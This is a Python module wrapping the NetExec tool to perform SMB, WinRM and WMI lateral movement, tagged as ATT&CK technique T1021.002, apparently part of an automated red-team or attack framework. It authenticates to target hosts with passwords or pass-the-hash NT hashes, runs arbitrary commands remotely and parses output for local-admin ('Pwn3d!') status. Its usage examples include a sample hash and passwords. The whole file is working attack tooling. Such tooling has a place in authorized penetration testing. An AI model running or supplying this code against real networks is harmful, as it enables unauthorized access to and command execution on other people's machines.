import re
import subprocess
import time


TECHNIQUE_ID   = "T1021.002"
TECHNIQUE_NAME = "Lateral Movement via SMB"

TOOL_BINARY = "nxc"   # NetExec; older installs may use "netexec" or "crackmapexec"

VALID_METHODS = {"smb", "winrm", "wmi"}

# The key marker: (Pwn3d!) in a [+] auth line means local admin
PWNED_RE = re.compile(r"\[\+\].*\(Pwn3d!\)", re.IGNORECASE)
AUTH_SUCCESS_RE = re.compile(r"\[\+\].*(?:Password123|:|\w+:\\\\)", re.IGNORECASE)
AUTH_FAIL_RE = re.compile(r"\[\-\].*(?:STATUS_LOGON_FAILURE|STATUS_ACCOUNT_LOCKED|"
                           r"Invalid credentials|Authentication failed)", re.IGNORECASE)
CMD_EXECUTED_RE = re.compile(r"\[\+\].*Executed command", re.IGNORECASE)
TARGET_INFO_RE = re.compile(
    r"\[\*\].*\(name:([^)]+)\).*\(domain:([^)]+)\).*\(signing:(True|False)\)", re.IGNORECASE
)


def run_lateral_movement(
    target_ip,
    username,
    password=None,
    nt_hash=None,
    command=None,
    method="smb",
    domain=None,
    timeout=60,
):
    
    start = time.monotonic()

    if method not in VALID_METHODS:
        return _error(
            f"invalid method {method!r} — must be one of {VALID_METHODS}",
            duration=time.monotonic() - start,
        )
    if not password and not nt_hash:
        return _error(
            "provide either password or nt_hash",
            duration=time.monotonic() - start,
        )

    # Build nxc command
    cmd = [TOOL_BINARY, method, target_ip, "-u", username]

    if nt_hash:
        cmd += ["-H", nt_hash]   # Pass-the-Hash — nxc accepts the 32-char NT hash
    elif password:
        cmd += ["-p", password]

    if domain:
        cmd += ["-d", domain]

    if command:
        cmd += ["-x", command]

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as e:
        return _error(
            f"timed out after {timeout}s — target unreachable or port closed?",
            stderr=e.stderr or "",
            duration=time.monotonic() - start,
        )
    except FileNotFoundError:
        return _error(
            f"{TOOL_BINARY!r} not found. Install: pip install netexec  OR  apt install netexec",
            duration=time.monotonic() - start,
        )

    try:
        parsed = _parse(result.stdout, result.stderr, method)

        if parsed["auth_failed"]:
            return _error(
                "authentication failed — credentials rejected",
                stderr=result.stderr,
                duration=time.monotonic() - start,
            )

        return {
            "tool": "lateral_movement",
            "status": "success",
            "summary": _summary(parsed, target_ip, method, command),
            "data": parsed,
            "error": None,
            "raw_stderr_tail": None,
            "duration_seconds": round(time.monotonic() - start, 2),
        }
    except Exception as e:
        return _error(
            f"unexpected parse error: {e}",
            stderr=result.stderr,
            duration=time.monotonic() - start,
        )


# ─── Internal helpers ──────────────────────────────────────────────────────────

def _parse(stdout, stderr, method):
    
    target_hostname = None
    target_domain = None
    smb_signing = None
    local_admin = False
    auth_succeeded = False
    command_executed = False
    command_output_lines = []
    auth_failed = False
    collecting_output = False

    for line in stdout.splitlines():
        stripped = line.strip()
        if not stripped:
            continue

        # Target info line
        m = TARGET_INFO_RE.search(stripped)
        if m:
            target_hostname = m.group(1)
            target_domain = m.group(2)
            smb_signing = m.group(3).lower() == "true"
            continue

        # Auth failure
        if AUTH_FAIL_RE.search(stripped):
            auth_failed = True
            collecting_output = False
            continue

        # Successful auth + local admin check
        if stripped.startswith("[+]") and not command_executed:
            if PWNED_RE.search(stripped):
                local_admin = True
                auth_succeeded = True
            elif re.search(r"\[\+\].*\\\\", stripped) or re.search(r"\[\+\]\s+\S+\s+\S+:\d+", stripped):
                # [+] line with target:port = auth succeeded (no Pwn3d means no admin)
                auth_succeeded = True
            continue

        # Command executed marker
        if CMD_EXECUTED_RE.search(stripped):
            command_executed = True
            collecting_output = True
            continue

        # Collect command output (lines after "Executed command" marker)
        if collecting_output:
            # Strip the nxc prefix: "SMB  10.0.0.10  445  WIN10  [*] actual output"
            # The real content is the last field after the last known prefix pattern
            content = re.sub(
                r"^(?:SMB|WMI|WINRM)\s+\S+\s+\d+\s+\S+\s+\[\*\]\s*",
                "",
                stripped,
                flags=re.IGNORECASE,
            )
            content = re.sub(
                r"^(?:SMB|WMI|WINRM)\s+\S+\s+\d+\s+\S+\s+\[\+\]\s*",
                "",
                content,
                flags=re.IGNORECASE,
            )
            if content and content != stripped:  # only if the prefix was stripped
                command_output_lines.append(content)

    return {
        "target_hostname": target_hostname,
        "target_domain": target_domain,
        "smb_signing_enabled": smb_signing,
        "auth_succeeded": auth_succeeded,
        "local_admin": local_admin,
        "command_executed": command_executed,
        "command_output": "\n".join(command_output_lines).strip(),
        "command_output_lines": command_output_lines,
        "auth_failed": auth_failed,
        "method": method,
    }


def _summary(p, target_ip, method, command):
    if not p["auth_succeeded"]:
        return f"Lateral movement to {target_ip}: authentication failed."

    admin_str = "WITH local admin (Pwn3d!)" if p["local_admin"] else "without local admin (user-level only)"
    host_str = f" Host: {p['target_hostname']} ({p['target_domain']})." if p["target_hostname"] else ""
    signing_str = " SMB signing ON — PtH spray risk reduced." if p["smb_signing_enabled"] else ""

    if not command:
        return f"Auth to {target_ip} via {method}: succeeded {admin_str}.{host_str}{signing_str}"

    if not p["command_executed"]:
        return (
            f"Auth to {target_ip} via {method}: succeeded {admin_str} "
            f"but command execution FAILED — check exec method or AV.{host_str}"
        )

    output_preview = (p["command_output"][:120] + "...") if len(p["command_output"]) > 120 else p["command_output"]
    return (
        f"Command executed on {target_ip} via {method} ({admin_str}).{host_str} "
        f"Output: {output_preview!r}"
    )


def _error(reason, stdout="", stderr="", duration=None):
    return {
        "technique_id": TECHNIQUE_ID,
        "technique_name": TECHNIQUE_NAME,
        "tool": "lateral_movement",
        "status": "timeout" if "timed out" in reason else "error",
        "summary": f"Lateral movement failed: {reason}",
        "data": None,
        "error": reason,
        "raw_stderr_tail": (stderr or "")[-500:] or None,
        "duration_seconds": round(duration, 2) if duration is not None else None,
    }


# ─── Terminal smoke-test ───────────────────────────────────────────────────────
# python3 lateral_movement.py 10.0.0.10 administrator -p Password123 -c "whoami"
# python3 lateral_movement.py 10.0.0.10 administrator -H NT_HASH -c "whoami"

if __name__ == "__main__":
    import argparse, json

    ap = argparse.ArgumentParser(
        description="Lateral movement wrapper — manual test harness",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Auth check only (no command), plaintext:
  python3 lateral_movement.py 10.0.0.10 administrator -p Password123

  # Execute whoami:
  python3 lateral_movement.py 10.0.0.10 administrator -p Password123 -c "whoami /all"

  # Pass-the-Hash (no plaintext needed):
  python3 lateral_movement.py 10.0.0.10 administrator -H 8846f7eaee8fb117ad06bdd830b7586c -c "whoami"

  # WinRM:
  python3 lateral_movement.py 10.0.0.10 administrator -p Password123 --method winrm -c "hostname"

  # Test wrong creds:
  python3 lateral_movement.py 10.0.0.10 administrator -p WRONG
        """,
    )
    ap.add_argument("target_ip",            help="Target machine IP")
    ap.add_argument("username",             help="Username")
    ap.add_argument("-p", "--password",     default=None)
    ap.add_argument("-H", "--nt-hash",      default=None, dest="nt_hash",
                    help="32-char NT hash for PtH")
    ap.add_argument("-c", "--command",      default=None, help="Command to execute")
    ap.add_argument("--method",             default="smb", choices=list(VALID_METHODS))
    ap.add_argument("--domain",             default=None)
    ap.add_argument("--timeout", type=int,  default=60)
    args = ap.parse_args()

    result = run_lateral_movement(
        target_ip=args.target_ip,
        username=args.username,
        password=args.password,
        nt_hash=args.nt_hash,
        command=args.command,
        method=args.method,
        domain=args.domain,
        timeout=args.timeout,
    )
    print(json.dumps(result, indent=2))